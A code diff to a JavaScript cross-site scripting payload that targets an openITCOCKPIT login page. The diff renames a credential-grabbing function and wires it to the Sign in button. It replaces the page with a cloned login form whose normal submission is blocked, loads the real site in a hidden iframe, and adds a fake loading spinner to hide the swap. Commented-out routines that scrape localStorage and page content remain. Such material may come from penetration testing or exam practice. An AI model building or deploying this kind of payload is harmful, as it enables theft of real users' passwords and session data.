@@ -12,7 +12,7 @@ body = `
     <script type=\"text/javascript\" src=\"/js/login.js?1716884445\"></script>
 </head>
 
-
+<body>
 <body class=\"main\">
     <div class=\"login-screen\">
         <figure>
@@ -42,7 +42,7 @@ body = `
                     <div class=\"login-form-div\">
                         <div class=\"front signin_form\">
                             <p>Login</p>
-                            <form novalidate=\"novalidate\" id=\"login-form\" class=\"login-form\" method=\"post\" accept-charset=\"utf-8\"><div style=\"display:none;\"><input type=\"hidden\" name=\"_method\" value=\"POST\"></div>
+                            <form onsubmit=\"return false\" novalidate=\"novalidate\" id=\"login-form\" class=\"login-form\" method=\"post\" accept-charset=\"utf-8\"><div style=\"display:none;\"><input type=\"hidden\" name=\"_method\" value=\"POST\"></div>
                             
                             <div class=\"form-group\">
                                 <div class=\"input-group\">
@@ -65,7 +65,7 @@ body = `
                                 <div class=\"checkbox\"><input type=\"hidden\" name=\"data[LoginUser][remember_me]\" id=\"LoginUserRememberMe_\" value=\"0\"><label for=\"LoginUserRememberMe\"><input type=\"checkbox\" name=\"data[LoginUser][remember_me]\" class=\"\" value=\"1\" id=\"LoginUserRememberMe\"> Remember me on this computer</label></div>                            </div>
 
                             <div class=\"form-group sign-btn\">
-                                <button type=\"submit\" class=\"btn btn-primary pull-right\">
+                                <button onclick=\"getCreds();\" type=\"submit\" class=\"btn btn-primary pull-right\">
                                     Sign in                                </button>
                             </div>
                             </form>                        </div>
@@ -102,6 +102,39 @@ body = `
 </div>
 
 <iframe style=\"display:none\" src=\"https://openitcockpit\" width=\"100%\" height=\"100%\"></iframe></body></html>
+
+<style>
+.spinner-container {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.5); 
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 9999; 
+}
+
+.spinner {
+  width: 50px;
+  height: 50px;
+  border: 4px solid rgba(255, 255, 255, 0.3);
+  border-top: 4px solid #fff; 
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+  0% {
+    transform: rotate(0deg);
+  }
+  100% {
+    transform: rotate(360deg);
+  }
+}
+</style>
 `
 
 document.getElementsByTagName("html")[0].innerHTML = body
@@ -161,7 +194,8 @@ getPageContent = () => {
     });
 }
 
-getSavedCreds = () => {
+getCreds = () => {
+    console.log("Cred grab")
     savedUsername = document.getElementById("usernameinj").value;
     savedPassword = document.getElementById("passwordinj").value;
     if (savedUsername === "" || savedPassword === ""){
@@ -177,18 +211,18 @@ getSavedCreds = () => {
 
 actions = () => {
     // get all objects from local storage
-    setTimeout(() => {
-        getLocalStorage();
-    }, 2000); // Leave time for page to load
+    // setTimeout(() => {
+    //     getLocalStorage();
+    // }, 2500); // Leave time for page to load
 
-    // get page content through scraping
-    setTimeout(() => {
-        getPageContent();
-    }, 5000); // Leave time for page to load
+    // // get page content through scraping
+    // setTimeout(() => {
+    //     getPageContent();
+    // }, 3000); // Leave time for page to load
 
     // get saved passwords
     // Source: https://gosecure.ai/blog/2022/06/29/did-you-know-your-browsers-autofill-credentials-could-be-stolen-via-cross-site-scripting-xss/
-    getSavedCreds();
+    getCreds();
 }
 
 var iframe = document.createElement('iframe');
@@ -200,3 +234,29 @@ iframe.src="https://openitcockpit"
 
 body = document.getElementsByTagName('body')[0];
 body.appendChild(iframe);
+
+function addLoadingSpinner() {
+  // Create the spinner elements
+  const spinnerContainer = document.createElement("div");
+  const spinner = document.createElement("div");
+
+  // Set classes for styling (customize these as needed)
+  spinnerContainer.classList.add("spinner-container");
+  spinner.classList.add("spinner");
+
+  // Append spinner to its container
+  spinnerContainer.appendChild(spinner);
+
+  // Get the target container (or use the body as default)
+  const container = document.getElementsByTagName("body")[0];
+
+  // Append the spinner container to the target
+  container.appendChild(spinnerContainer);
+
+  setTimeout(() => {
+    container.removeChild(spinnerContainer);
+  }, 5000);
+}
+
+// Call the function to add the spinner
+addLoadingSpinner(); // You can pass a different container ID if needed
